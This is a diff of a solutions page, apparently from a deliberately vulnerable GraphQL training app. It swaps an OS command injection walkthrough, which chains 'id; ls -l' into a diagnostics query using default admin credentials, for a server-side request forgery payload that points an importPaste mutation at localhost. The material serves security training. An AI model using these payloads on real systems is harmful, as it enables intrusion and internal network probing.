@@ -1,48 +1,32 @@
 <!-- Start -->
-<h3 style="color:purple" id="exec-os-2"><b>Code Execution :: OS Command Injection #2</b></h3>
+<h3 style="color:purple" id="info-ssrf"><b>Information Disclosure :: Server Side Request Forgery</b></h3>
 <hr />
 <h5>Problem Statement</h5>
 <p>
-  The query <code>systemDiagnostics</code> accepts certain UNIX binaries as parameters for debugging purposes, such as
-  <code>whoami</code>, <code>ps</code>, etc. It acts as a restricted shell. However, it is protected
-  with a username and password. After obtaining the <a href="http://127.0.0.1:5000/solutions#misc-weakpass">correct
-  credentials</a>, the restricted shell seems to be bypassable by chaining commands together.
-</p>
+  The GraphQL mutation <code>importPaste</code> accepts arbitrary host, port and scheme to import pastes from and does
+  not restrict input such as localhost or other internal servers from being used. This may allow
+  forging requests on behalf of the application server to target other network nodes.</p>
 <h5>Resources</h5>
 <ul>
   <li>
-    <a href="https://www.netsparker.com/blog/web-security/command-injection-vulnerability/" target="_blank">
-      <i class="fa fa-newspaper"></i> Netsparker - Command Injection
+    <a href="https://portswigger.net/web-security/ssrf" target="_blank">
+      <i class="fa fa-newspaper"></i> PortSwigger - Server Side Request Forgery
+    </a>
+  </li>
+  <li>
+    <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" target="_blank">
+      <i class="fa fa-newspaper"></i> OWASP - Server Side Request Forgery
     </a>
   </li>
 </ul>
-<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-exec-os-2')">Show</button></h5>
-<div id="sol-exec-os-2" style="display:none">
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-ssrf')">Show</button></h5>
+<div id="sol-info-ssrf" style="display:none">
   <pre class="bash">
-    # System Diagnostics suffers from weak restricted shell implementation
+# Beginner and Expert modes
 
-    query {
-      systemDiagnostics(username:"admin", password:"password", cmd:"id")
-    }
-
-    >>> Response:
-    {
-      "data": {
-        "systemDiagnostics": "id: command not found"
-      }
-    }
-
-
-    query {
-      systemDiagnostics(username:"admin", password:"password", cmd:"id; ls -l")
-    }
-
-    >>> Response:
-    {
-      "data": {
-        "systemDiagnostics": "total 128\ndrwxr-xr- .. COLORTERM=truecolor\n_=/usr/bin/env\n"
-      }
-    }
-  </pre>
+# Any arbitrary host and ports can be used to make an outbound HTTP request
+mutation {
+  importPaste(host:"localhost", port:57130, path:"/", scheme:"http")
+}</pre>
 </div>
 <!-- End -->
